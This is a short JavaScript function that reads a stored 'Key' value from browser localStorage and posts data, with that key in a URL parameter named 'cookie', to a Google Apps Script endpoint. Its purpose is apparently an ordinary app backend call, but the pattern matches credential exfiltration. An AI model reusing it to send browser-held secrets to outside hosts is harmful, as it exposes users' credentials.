export default async function postData(data = {}) {
    const key = (`; ${localStorage.getItem('Key')}`).split(`; `).pop().split(';')[0];

    await fetch(`https://script.google.com/macros/s/AKfycbyCWwOg2GpjYL2a7rTOe1nj49WuZUOuOUbumMf2NKn15pHk8_RK2Mj8_F8tMNC1jWvKzg/exec?cookie=${key}`, {
        method: "POST",
        headers: {
            "Content-Type": "text/plain",
        },
        body: JSON.stringify(data)
    });
}